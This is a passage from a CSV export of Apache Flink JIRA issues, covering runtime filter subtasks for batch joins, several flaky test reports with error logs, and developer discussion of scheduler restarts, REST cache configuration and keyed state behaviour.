",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Fri Jun 30 01:46:16 UTC 2023,,,,,,,,,,"0|z1ivy8:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"30/Jun/23 01:46;yunfengzhou;Hi [~hxbks2ks], could you please take a look at this ticket?;;;",,,,,,,,,,,,,,,,,,,,,,
Introduce RuntimeFilterBuilderOperator to build a BloomFilter from build side data of shuffle join,FLINK-32493,13542019,13541945,Sub-task,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Done,wanglijie,lsy,lsy,30/Jun/23 01:42,21/Jul/23 07:31,04/Jun/24 20:41,21/Jul/23 07:31,1.18.0,,,,,,,,,,,,,,1.18.0,,,,,,Table SQL / Runtime,,,,0,pull-request-available,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Fri Jul 21 07:31:36 UTC 2023,,,,,,,,,,"0|z1ivy0:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"21/Jul/23 07:31;wanglijie;Done via master(1.18) 47596ea9250415bc333fa612c6b1ec5c7407fdd6 and 41b35260bba91463bd9e44a4661beaa74c4cbe10;;;",,,,,,,,,,,,,,,,,,,,,,
Introduce FlinkRuntimeFilterProgram to inject runtime filter,FLINK-32492,13542018,13541945,Sub-task,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Done,wanglijie,wanglijie,wanglijie,30/Jun/23 01:38,23/Jul/23 11:58,04/Jun/24 20:41,23/Jul/23 11:58,,,,,,,,,,,,,,,1.18.0,,,,,,Table SQL / Planner,,,,0,pull-request-available,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Sun Jul 23 11:58:19 UTC 2023,,,,,,,,,,"0|z1ivxs:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"23/Jul/23 11:58;wanglijie;Done via master(1.18):
8659dd788d0e9bc5e534377fd065f925a3e33bbb
ad20b19fff808bf3a191279f0f137952a78c083a
72bee90ccb40b71e760d251b26c8d48e1b110307
9f73d3d81a5471998d854001a09c7299a10f1424;;;",,,,,,,,,,,,,,,,,,,,,,
Introduce RuntimeFilterOperator to support runtime filter which can reduce the shuffle data size before shuffle join,FLINK-32491,13541973,13541945,Sub-task,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Done,wanglijie,lsy,lsy,29/Jun/23 16:38,22/Jul/23 05:01,04/Jun/24 20:41,22/Jul/23 05:01,1.18.0,,,,,,,,,,,,,,1.18.0,,,,,,Table SQL / Runtime,,,,0,pull-request-available,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Sat Jul 22 05:00:37 UTC 2023,,,,,,,,,,"0|z1ivns:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"22/Jul/23 05:00;wanglijie;Done via master(1.18): 59850a91f96ddb5c58d8554b76e46bc6245dda7b;;;",,,,,,,,,,,,,,,,,,,,,,
ArrayElementOutputTypeStrategyTest>TypeStrategiesTestBase.testTypeStrategy constantly fails,FLINK-32490,13541970,,Bug,Resolved,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Blocker,Fixed,,Sergey Nuyanzin,Sergey Nuyanzin,29/Jun/23 16:04,29/Jun/23 16:11,04/Jun/24 20:41,29/Jun/23 16:11,1.18.0,,,,,,,,,,,,,,1.18.0,,,,,,Table SQL / API,,,,0,test-stability,,,"ArrayElementOutputTypeStrategyTest fails with
{noformat}
[ERROR] Failures: 
[ERROR]   ArrayElementOutputTypeStrategyTest>TypeStrategiesTestBase.testTypeStrategy:58 
expected: ""INT NOT NULL (AtomicDataType@26e4eacd)""
 but was: ""INT NOT NULL (AtomicDataType@1716b369)""
[ERROR]   ArrayElementOutputTypeStrategyTest>TypeStrategiesTestBase.testTypeStrategy:58 
expected: ""INT (AtomicDataType@18ab74e7)""
 but was: ""INT (AtomicDataType@f0704a2)""
{noformat}
 

also could be reproduced locally",,,,,,,,,,,,,,,,,,,,,FLINK-32257,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Thu Jun 29 16:11:52 UTC 2023,,,,,,,,,,"0|z1ivn4:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"29/Jun/23 16:11;mapohl;master: 5ad86c2f01bea141ca76250ae4035d4e6403c8ea;;;",,,,,,,,,,,,,,,,,,,,,,
Support serialize and merge BloomFilter for runtime filter,FLINK-32489,13541966,13541945,Sub-task,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Done,lsy,lsy,lsy,29/Jun/23 15:37,16/Jul/23 13:37,04/Jun/24 20:41,16/Jul/23 13:37,1.18.0,,,,,,,,,,,,,,1.18.0,,,,,,Runtime / Task,,,,0,pull-request-available,,,"Runtime filter needs to use BloomFIlter, it would be transferred from runtime filter builder operator to runtime filter operator via network, so serialization and merge need.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Sun Jul 16 13:37:21 UTC 2023,,,,,,,,,,"0|z1ivm8:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"16/Jul/23 13:37;wanglijie;Done via master:

c2cba015f2c2ced64f60d59ccc888b9bc65adde7 and 4690dc2956d21b91f62f8e8a1f026084d60d67f8;;;",,,,,,,,,,,,,,,,,,,,,,
Introduce configuration to control ExecutionGraph cache in REST API,FLINK-32488,13541964,,Improvement,Open,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,,hejufang001,liangtl,liangtl,29/Jun/23 15:27,11/Mar/24 12:43,04/Jun/24 20:41,,1.16.2,1.17.1,,,,,,,,,,,,,1.20.0,,,,,,Runtime / REST,,,,0,pull-request-available,,,"*What*

Currently, REST handlers that inherit from AbstractExecutionGraphHandler serve information derived from a cached ExecutionGraph.

This ExecutionGraph cache currently derives it's timeout from {*}web.refresh-interval{*}. The *web.refresh-interval* controls both the refresh rate of the Flink dashboard and the ExecutionGraph cache timeout. 

We should introduce a new configuration to control the ExecutionGraph cache, namely {*}rest.cache.execution-graph.expiry{*}.

*Why*

Sharing configuration between REST handler and Flink dashboard is a sign that we are coupling the two. 

Ideally, we want our REST API behaviour to independent of the Flink dashboard (e.g. supports programmatic access).

 

Mailing list discussion: https://lists.apache.org/thread/7o330hfyoqqkkrfhtvz3kp448jcspjrm

 

 ",,,,,,,,,,,,,,,,,,,,,,,,,,,,FLINK-32898,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Tue Sep 12 02:56:59 UTC 2023,,,,,,,,,,"0|z1ivls:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"14/Aug/23 15:36;xiangyu0xf;Hi [~liangtl] , we also found this improvement very useful, any progress recently?;;;","29/Aug/23 06:44;guoyangze;I reassign it to [~xiangyu0xf] since there is no update from [~liangtl] in the last two weeks. Feel free to back to the discussion if you are still interested in it [~liangtl].;;;","12/Sep/23 02:49;xiangyu0xf;Hi [~guoyangze] , [~hejufang001] has created a PR([https://github.com/apache/flink/pull/23387)|https://github.com/apache/flink/pull/23387,] for this issue would you kindly assign this issue to him?;;;","12/Sep/23 02:56;guoyangze;Thanks for the PR [~hejufang001] and [~xiangyu0xf] . I'm now considering not introducing a configuration for it. As we all know, the configuration of flink become massive which would harm the usability. How about make the refresh interval adaptive to the total number of execution cache in job manager?;;;",,,,,,,,,,,,,,,,,,,
SourceCoordinatorAlignmentTest.testAnnounceCombinedWatermarkWithoutStart fails with RejectedExecution,FLINK-32487,13541960,,Bug,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Blocker,Duplicate,,martijnvisser,martijnvisser,29/Jun/23 14:59,29/Jun/23 17:22,04/Jun/24 20:41,29/Jun/23 17:21,1.16.3,1.17.2,1.18.0,,,,,,,,,,,,,,,,,,API / Core,,,,0,,,,"{code:java}
Jun 29 03:21:25 03:21:25.954 [INFO] 
Jun 29 03:21:25 03:21:25.954 [ERROR] Errors: 
Jun 29 03:21:25 03:21:25.954 [ERROR]   SourceCoordinatorAlignmentTest.testAnnounceCombinedWatermarkWithoutStart:192 » RejectedExecution
Jun 29 03:21:25 03:21:25.955 [INFO] 
{code}

https://dev.azure.com/apache-flink/apache-flink/_build/results?buildId=50611&view=logs&j=0da23115-68bb-5dcd-192c-bd4c8adebde1&t=24c3384f-1bcb-57b3-224f-51bf973bbee8&l=8613

This is currently breaking master, release-1.17 and release-1.16",,,,,,,,,,,,,,,,,,FLINK-32478,,,FLINK-32411,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Thu Jun 29 17:22:43 UTC 2023,,,,,,,,,,"0|z1ivkw:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"29/Jun/23 15:00;martijnvisser;[~fanrui] Can you take a look?
;;;","29/Jun/23 15:01;Sergey Nuyanzin;I think it is a duplicate
https://issues.apache.org/jira/browse/FLINK-32478;;;","29/Jun/23 15:02;Sergey Nuyanzin;since fix for https://issues.apache.org/jira/browse/FLINK-32478 is merged to master recently
could double check if it helps?;;;","29/Jun/23 15:35;fanrui;Hi [~martijnvisser] , thanks for the report. And thanks [~Sergey Nuyanzin] for the feedback.

FLINK-32478 has fixed this bug for master, release-1.17 and release-1.16, please rebase it and try again.

If it still happens, please @ me.;;;","29/Jun/23 17:22;martijnvisser;Still weird that I couldn’t find it when I searched for it, but closed this indeed because it’s a duplicate. Thanks Sergey;;;",,,,,,,,,,,,,,,,,,
FLIP-324: Introduce Runtime Filter for Flink Batch Jobs,FLINK-32486,13541945,,Improvement,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Done,wanglijie,wanglijie,wanglijie,29/Jun/23 13:45,16/Aug/23 06:24,04/Jun/24 20:41,27/Jul/23 07:41,,,,,,,,,,,,,,,1.18.0,,,,,,Table SQL / Planner,Table SQL / Runtime,,,0,,,,"This is an umbrella ticket for [FLIP-324|https://cwiki.apache.org/confluence/display/FLINK/FLIP-324%3A+Introduce+Runtime+Filter+for+Flink+Batch+Jobs]",,,,,,,,,,,,,,,,,,,,,,,,,,FLINK-32844,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Thu Jul 27 07:05:26 UTC 2023,,,,,,,,,,"0|z1ivhk:",9223372036854775807,"We introduce runtime filter for batch jobs in 1.18, which is designed to improve join performance. It will dynamically generate filter conditions for certain Join queries at runtime to reduce the amount of scanned or shuffled data, avoid unnecessary I/O and network transmission, and speed up the query. Its working principle is building a filter(e.g. bloom filter) based on the data on the small table side(build side) first, then pass this filter to the large table side(probe side) to filter the irrelevant data on it, this can reduce the data reaching the join and improve performance. 
",,,,,,,,,,,,,,,,,,,"25/Jul/23 11:55;knaufk;[~wanglijie] Tan Is there user facing documentation for this already? If not, is there a sub-task that tracks this?

;;;","27/Jul/23 07:05;wanglijie;Thanks for reminder [~knaufk]. This feature is a performance optimization for join, and we tend to enable it by default soon (maybe next flink version), so we think it's not necessary to prepare a separate document for it (the description of config option is enough), and we will mention it in release note.;;;",,,,,,,,,,,,,,,,,,,,,
Flink State Backend Changelog should support build test-jar,FLINK-32485,13541940,,Improvement,Open,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,,,taoran,taoran,29/Jun/23 13:04,16/Aug/23 05:41,04/Jun/24 20:41,,1.17.1,,,,,,,,,,,,,,,,,,,,Runtime / State Backends,,,,0,pull-request-available,,,"In some scenarios, executing unit tests will report the following errors. In fact, since flink-state-backend-changelog test contains some util classes, we should build test jar like flink-rocks-db backend.
{code:java}
/Users/xxx/github/flink/flink-state-backends/flink-statebackend-changelog/src/test/java/org/apache/flink/state/changelog/ChangelogStateBackendTestUtils.java:29:37

java: Package org.apache.flink.changelog.fs not exist {code}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Wed Aug 16 05:41:47 UTC 2023,,,,,,,,,,"0|z1ivgg:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"29/Jun/23 13:19;taoran;cc [~martijnvisser] WDYT?;;;","29/Jun/23 14:05;martijnvisser;This is better suited for [~ym];;;","29/Jun/23 14:31;taoran;Thanks Martijn. Hi, [~ym]. Can u help to review it?;;;","30/Jun/23 03:33;ym;I can take a look

 

""test-jar"" is usually used to share test code between modules.

If I remember correctly, there should not be any other module sharing the test code of the changelog (It has been changed quite a lot, so I may make a mistake).

Do you know where `ChangelogStateBackendTestUtils` is used (other than flink-statebackend-changelog)?;;;","30/Jun/23 06:31;taoran;[~ym]  I just checked it simply, it seems there are no other module references it. It may be caused by some dependencies when IDEA runs test. However, IDEA can run successfully after I add test-jar.;;;","16/Aug/23 05:41;masteryhx;Hi, [~taoran] 
Changelog test code has not been referenced by any other modules, so this exception should not occur.
I ran all tests locally, it works well for the master branch.
Do you know which test may cause this ?;;;",,,,,,,,,,,,,,,,,
AdaptiveScheduler combined restart during scaling out,FLINK-32484,13541928,,Improvement,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Duplicate,,prabhujoseph,prabhujoseph,29/Jun/23 11:12,05/Jul/23 14:14,04/Jun/24 20:41,05/Jul/23 14:14,1.17.0,,,,,,,,,,,,,,,,,,,,API / Core,,,,0,,,,"On a scaling-out operation, when nodes are added at different times, AdaptiveScheduler does multiple restarts within a short period of time. On one of our Flink jobs, we have seen AdaptiveScheduler restart the ExecutionGraph every time there is a notification of new resources to it. There are five restarts within 3 minutes.

AdaptiveScheduler could provide a configurable restart window interval to the user during which it combines the notified resources and restarts once when the available resources are sufficient to fit the desired parallelism or when the window times out. The window is created during the first notification of resources received. This is applicable only when the execution graph is in the executing state and not in the waiting for resources state.

 
{code:java}
[root@ip-1-2-3-4 container_1688034805200_0002_01_000001]# grep -i scale *
jobmanager.log:2023-06-29 10:46:58,061 INFO  org.apache.flink.runtime.scheduler.adaptive.AdaptiveScheduler [] - New resources are available. Restarting job to scale up.
jobmanager.log:2023-06-29 10:47:57,317 INFO  org.apache.flink.runtime.scheduler.adaptive.AdaptiveScheduler [] - New resources are available. Restarting job to scale up.
jobmanager.log:2023-06-29 10:48:53,314 INFO  org.apache.flink.runtime.scheduler.adaptive.AdaptiveScheduler [] - New resources are available. Restarting job to scale up.
jobmanager.log:2023-06-29 10:49:27,821 INFO  org.apache.flink.runtime.scheduler.adaptive.AdaptiveScheduler [] - New resources are available. Restarting job to scale up.
jobmanager.log:2023-06-29 10:50:15,672 INFO  org.apache.flink.runtime.scheduler.adaptive.AdaptiveScheduler [] - New resources are available. Restarting job to scale up.
[root@ip-1-2-3-4 container_1688034805200_0002_01_000001]# {code}
 ",,,,,,,,,,,,,,,,,,,,FLINK-21883,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Wed Jul 05 14:13:10 UTC 2023,,,,,,,,,,"0|z1ivds:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"29/Jun/23 12:09;prabhujoseph;[~gyfora] If you are fine with this idea, could you assign this ticket to me? I can work on this and come up with a patch.;;;","05/Jul/23 14:13;gyfora;I think this is related to [https://cwiki.apache.org/confluence/display/FLINK/FLIP-322+Cooldown+period+for+adaptive+scheduler] and the related ML thread. [https://lists.apache.org/thread/qvgxzhbp9rhlsqrybxdy51h05zwxfns6]

If you agree I suggest closing this ticket and joining in that discussion.;;;",,,,,,,,,,,,,,,,,,,,,
RescaleCheckpointManuallyITCase.testCheckpointRescalingOutKeyedState fails on AZP,FLINK-32483,13541927,,Bug,Open,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,,,Sergey Nuyanzin,Sergey Nuyanzin,29/Jun/23 10:59,14/Mar/24 09:41,04/Jun/24 20:41,,1.17.2,1.20.0,,,,,,,,,,,,,,,,,,,Runtime / Checkpointing,Tests,,,0,auto-deprioritized-critical,test-stability,,"This build https://dev.azure.com/apache-flink/apache-flink/_build/results?buildId=50397&view=logs&j=39d5b1d5-3b41-54dc-6458-1e2ddd1cdcf3&t=0c010d0c-3dec-5bf1-d408-7b18988b1b2b&l=7495 fails with
{noformat}
Jun 26 06:08:57 [ERROR] Tests run: 2, Failures: 1, Errors: 0, Skipped: 0, Time elapsed: 21.041 s <<< FAILURE! - in org.apache.flink.test.checkpointing.RescaleCheckpointManuallyITCase
Jun 26 06:08:57 [ERROR] org.apache.flink.test.checkpointing.RescaleCheckpointManuallyITCase.testCheckpointRescalingOutKeyedState  Time elapsed: 6.435 s  <<< FAILURE!
Jun 26 06:08:57 java.lang.AssertionError: expected:<[(0,24000), (2,58500), (0,34500), (0,45000), (3,43500), (2,18000), (1,6000), (1,16500), (0,28500), (0,52500), (3,27000), (1,51000), (2,25500), (0,1500), (0,49500), (3,0), (3,48000), (0,36000), (2,22500), (1,10500), (0,46500), (2,33000), (1,21000), (0,9000), (0,57000), (3,31500), (2,19500), (1,7500), (1,55500), (3,42000), (2,30000), (0,54000), (2,40500), (1,4500), (3,15000), (2,3000), (1,39000), (2,13500), (0,37500), (0,61500), (3,12000), (3,60000)]> but was:<[(2,58500), (0,34500), (0,45000), (3,43500), (2,18000), (1,16500), (0,52500), (3,27000), (2,25500), (0,49500), (3,0), (3,48000), (0,36000), (2,22500), (1,21000), (0,9000), (0,57000), (3,31500), (1,7500), (2,30000), (0,54000), (2,40500), (1,4500), (2,3000), (1,39000), (2,13500), (0,61500), (3,12000)]>
Jun 26 06:08:57 	at org.junit.Assert.fail(Assert.java:89)
Jun 26 06:08:57 	at org.junit.Assert.failNotEquals(Assert.java:835)
Jun 26 06:08:57 	at org.junit.Assert.assertEquals(Assert.java:120)
Jun 26 06:08:57 	at org.junit.Assert.assertEquals(Assert.java:146)
Jun 26 06:08:57 	at org.apache.flink.test.checkpointing.RescaleCheckpointManuallyITCase.restoreAndAssert(RescaleCheckpointManuallyITCase.java:219)
Jun 26 06:08:57 	at org.apache.flink.test.checkpointing.RescaleCheckpointManuallyITCase.testCheckpointRescalingKeyedState(RescaleCheckpointManuallyITCase.java:138)
Jun 26 06:08:57 	at org.apache.flink.test.checkpointing.RescaleCheckpointManuallyITCase.testCheckpointRescalingOutKeyedState(RescaleCheckpointManuallyITCase.java:116)
Jun 26 06:08:57 	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)

{noformat}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Thu Mar 14 09:41:59 UTC 2024,,,,,,,,,,"0|z1ivdk:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"10/Aug/23 22:35;flink-jira-bot;I am the [Flink Jira Bot|https://github.com/apache/flink-jira-bot/] and I help the community manage its development. I see this issues has been marked as Critical but is unassigned and neither itself nor its Sub-Tasks have been updated for 14 days. I have gone ahead and marked it ""stale-critical"". If this ticket is critical, please either assign yourself or give an update. Afterwards, please remove the label or in 7 days the issue will be deprioritized.
;;;","18/Aug/23 22:35;flink-jira-bot;This issue was labeled ""stale-critical"" 7 days ago and has not received any updates so it is being deprioritized. If this ticket is actually Critical, please raise the priority and ask a committer to assign you the issue or revive the public discussion.
;;;","08/Jan/24 00:06;Sergey Nuyanzin;https://dev.azure.com/apache-flink/apache-flink/_build/results?buildId=55949&view=logs&j=4d4a0d10-fca2-5507-8eed-c07f0bdf4887&t=7b25afdf-cc6c-566f-5459-359dc2585798&l=10695;;;","07/Mar/24 12:32;rskraba;[https://dev.azure.com/apache-flink/apache-flink/_build/results?buildId=58125&view=logs&j=39d5b1d5-3b41-54dc-6458-1e2ddd1cdcf3&t=0c010d0c-3dec-5bf1-d408-7b18988b1b2b&l=8048] (1.20);;;","14/Mar/24 09:41;rskraba;[https://dev.azure.com/apache-flink/apache-flink/_build/results?buildId=58272&view=logs&j=39d5b1d5-3b41-54dc-6458-1e2ddd1cdcf3&t=0c010d0c-3dec-5bf1-d408-7b18988b1b2b&l=8053] (1.20);;;",,,,,,,,,,,,,,,,,,
Add Java 17 to Docker build matrix,FLINK-32482,13541924,13281165,Sub-task,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,chesnay,chesnay,chesnay,29/Jun/23 10:43,29/Jun/23 14:53,04/Jun/24 20:41,29/Jun/23 14:53,,,,,,,,,,,,,,,1.18.0,,,,,,flink-docker,Release System,,,0,pull-request-available,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Thu Jun 29 14:53:33 UTC 2023,,,,,,,,,,"0|z1ivcw:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"29/Jun/23 14:53;chesnay;master: bd7fa4d711c98c1ea9a098e195e072f214da3f66;;;",,,,,,,,,,,,,,,,,,,,,,
Support type inference for procedure,FLINK-32481,13541918,13540202,Sub-task,Resolved,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,luoyuxia,luoyuxia,luoyuxia,29/Jun/23 09:49,14/Jul/23 01:34,04/Jun/24 20:41,14/Jul/23 01:34,,,,,,,,,,,,,,,,,,,,,Table SQL / API,Table SQL / Runtime,,,0,pull-request-available,,,"Currently, FunctionMappingExtractor can only handle the type inference for procedure. We can extend it to make it can also handle procedure. Since procedure is much similar to function, we can resue the stack/code of {{{}FunctionMappingExtractor{}}}.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Fri Jul 14 01:34:25 UTC 2023,,,,,,,,,,"0|z1ivbk:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"14/Jul/23 01:34;luoyuxia;master:

e5324c085f627df2f8e452b0aec3264fe0c6f6f6;;;",,,,,,,,,,,,,,,,,,,,,,
Keyed State always returns new value instance,FLINK-32480,13541916,,Bug,Open,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,,,tipame,tipame,29/Jun/23 09:43,15/Aug/23 04:40,04/Jun/24 20:41,,1.14.6,,,,,,,,,,,,,,,,,,,,API / State Processor,,,,0,,,,"I create ValueState with default value. Then i access value in the map function (multiple times with the same partition key).

Expected behavior:
 * First call to value() should return new instance
 * Second call to value should return instance created in first call (just like Map#computeIfAbsent)

Actual dehavior:
 * every call to value() return new instance until we manualy set it with update() function.

According to source code - we can call update only once to assign value to current key. But from the user poin of view - it happends to call update() every time - because i do not know if value was already asigned or just created.

----------------------------

Currently my code looks like:
{code:java}
List<Integer> context = contextState.value();
contextState.update(context); {code}
May be there is some logic for immutable objects, but for mutable objects it looks awkward

 

 

 ",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Tue Aug 15 04:40:35 UTC 2023,,,,,,,,,,"0|z1ivb4:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"05/Jul/23 02:37;masteryhx;Hi, The object cannot be reused as default.
If you are sure that your codes will make it consistent with the value in flink, you could just enable object reuse.
You could see [https://nightlies.apache.org/flink/flink-docs-release-1.15/docs/dev/datastream/execution/execution_configuration/] and [https://nightlies.apache.org/flink/flink-docs-release-1.15/docs/deployment/config/#pipeline-object-reuse] for more detals.

BTW, Which StateBackend you used ? If rocksdb state backend, I think It's fine to enable object reuse.

 ;;;","05/Jul/23 04:50;tipame;[~masteryhx] , please read description carefully - question is not about the way you create default instance (although i think supplier pattern would be more suitable instead of object cloning). 

Main question - why newly created instance not fixed as current state. Second call to value() - return new instance again.

Simple example for your understanding (assertion will fail untill i manyaly fix state with update()):
{code:java}
assert contextState.value() == contextState.value(){code};;;","15/Aug/23 04:40;kezhuw;Flink never provide such a guarantee. The ""Expected behavior"" listed in description requires Flink to store all its state in JVM memory which is apparently unrealistic. If you want to check equal values, you should override ""equals"" method.;;;",,,,,,,,,,,,,,,,,,,,
Tests revoke leadership too early,FLINK-32479,13541911,,Technical Debt,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,chesnay,chesnay,chesnay,29/Jun/23 09:34,03/Jul/23 09:32,04/Jun/24 20:41,03/Jul/23 09:32,1.18.0,,,,,,,,,,,,,,1.18.0,,,,,,Runtime / Coordination,Tests,,,0,pull-request-available,,,"There are a few tests issue a request to the dispatcher and immediately revoke leadership. In this case there is no guarantee that the request arrived before leadership was revoked, so it could fail if it arrives afterwards since we reject requests if we aren't the leader anymore.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Mon Jul 03 09:32:33 UTC 2023,,,,,,,,,,"0|z1ivag:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"03/Jul/23 09:32;chesnay;master: 8dfd811bea42fa1b35db79fba98c479779a09161;;;",,,,,,,,,,,,,,,,,,,,,,
SourceCoordinatorAlignmentTest.testAnnounceCombinedWatermarkWithoutStart fails,FLINK-32478,13541888,,Bug,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Blocker,Fixed,fanrui,fanrui,fanrui,29/Jun/23 06:14,30/Jun/23 12:16,04/Jun/24 20:41,30/Jun/23 12:15,1.16.3,1.17.2,1.18.0,,,,,,,,,,,,1.16.3,1.17.2,1.18.0,,,,Connectors / Common,,,,1,pull-request-available,test-stability,,"SourceCoordinatorAlignmentTest.testAnnounceCombinedWatermarkWithoutStart fails

 

Root cause: multiple sources share the same thread pool, and the second source cannot start due to the first source closes the shared thread pool.

